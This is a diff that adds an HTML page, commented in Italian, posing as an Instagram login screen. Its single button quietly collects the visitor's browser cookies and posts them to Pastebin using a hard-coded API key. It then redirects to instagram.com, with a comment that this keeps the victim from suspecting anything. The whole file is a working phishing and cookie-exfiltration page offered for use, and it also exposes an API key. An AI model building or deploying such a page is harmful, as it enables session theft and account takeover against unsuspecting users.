@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <style>
+        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border: 1px solid #dbdbdb; text-align: center; width: 350px; }
+        img { width: 175px; margin-bottom: 20px; }
+        button { background: #0095f6; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <!-- Logo Instagram -->
+    <img src="https://static.cdninstagram.com/rsrc.php/v3/yG/r/DeWwpYlYBOL.png">
+    <button onclick="sendCookies()">Accedi</button>
+</div>
+
+<script>
+    function sendCookies() {
+        // 1. Prendi i cookie del browser corrente
+        const cookies = document.cookie;
+        
+        // 2. La tua API Key
+        const apiKey = 'XSCtYiDCb0oUlK4EY7CtOtQR5Br6a-sK'; 
+        
+        // 3. Invia i dati a Pastebin in background (senza cambiare pagina)
+        fetch('https://pastebin.com/api/api_post.php', {
+            method: 'POST',
+            body: new URLSearchParams({
+                api_dev_key: apiKey,
+                api_paste_code: cookies,
+                api_option: 'paste'
+            })
+        })
+        .then(response => response.text())
+        .then(pasteUrl => {
+            // Il pastebin è stato creato. 
+            // Opzionale: reindirizza l'utente su Instagram per non far sospettare nulla
+            window.location.href = "https://www.instagram.com/";
+        })
+        .catch(error => console.error('Errore:', error));
+    }
+</script>
+</body>
+</html>
